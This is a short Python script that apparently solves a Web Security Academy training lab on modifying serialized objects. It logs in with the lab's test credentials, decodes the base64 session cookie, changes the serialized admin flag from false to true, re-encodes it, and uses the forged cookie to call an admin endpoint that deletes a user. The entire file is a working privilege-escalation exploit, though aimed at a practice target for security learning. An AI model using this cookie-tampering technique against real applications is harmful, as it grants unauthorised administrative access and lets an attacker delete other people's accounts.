# Lab: Modifying serialized objects
# difficulty: apprentice

import requests
import base64

sub = '0ae800bd0419df1a80ff99d80034005a'
url = f'https://{sub}.web-security-academy.net'

def login():
    global session
    session = requests.Session()
    body = {
        'username': 'wiener',
        'password': 'peter'
    }
    session.post(url + '/login', data=body)

def exploit():
    cookie = session.cookies['session'].replace('%3d', '=')
    cookie = base64.b64decode(cookie)

    # replacing admin to true
    cookie = cookie.replace(b'b:0', b'b:1')
    
    # base64 session
    cookie = base64.urlsafe_b64encode(cookie)

    session.cookies.clear()
    session.cookies['session'] = cookie.decode()
    r = session.get(url + '/admin/delete?username=carlos', allow_redirects=False)
    print(r.request.headers)

if __name__ == '__main__':
    login()
    exploit()